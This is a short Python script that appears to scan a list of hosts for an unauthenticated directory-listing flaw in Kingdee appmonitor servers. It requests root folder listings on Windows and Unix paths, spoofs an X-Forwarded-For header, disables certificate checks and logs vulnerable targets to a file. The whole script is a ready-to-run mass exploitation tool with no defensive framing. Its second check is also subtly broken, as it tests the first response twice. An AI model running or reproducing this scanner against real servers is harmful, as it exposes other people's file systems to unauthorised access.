import requests

def getres(target):
	try:
		headers={
		'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; WOW64; rv:49.0) Gecko/20100101 Firefox/49.0',
		'X-Forwarded-For': '8.8.8.8'
		}
		tar1='/appmonitor/protected/selector/server_file/files?folder=C://&suffix='
		tar2='/appmonitor/protected/selector/server_file/files?folder=/&suffix='
		target1=target+tar1
		target2=target+tar2
		res1=requests.get(target1,headers=headers,verify=False,timeout=3)
		res2=requests.get(target2,headers=headers,verify=False,timeout=3)
		if res1.status_code == 200 and '{' in  res1.text and 'total' in res1.text:
			print('success   --->   ',target1)
			save('jindiesuccess.txt',target1)
		elif res1.status_code == 200 and '{' in res1.text and 'total' in res1.text:
			print('success   --->   ',target2)
			save('jindiesuccess.txt',target2)
		else:
			print(target)
	except Exception as e:
		pass


def save(fname,mystr):
	try:
		ff=open(fname,'a')
		ff.write(mystr+'\n')
	except Exception as e:
		pass
	finally:
		ff.close()

if __name__ == "__main__":
	f=open('jindie.txt','r')
	for target in f.readlines():
		if 'http' not in target:
			target='http://'+target.strip('\n')
		getres(target.strip('\n').strip())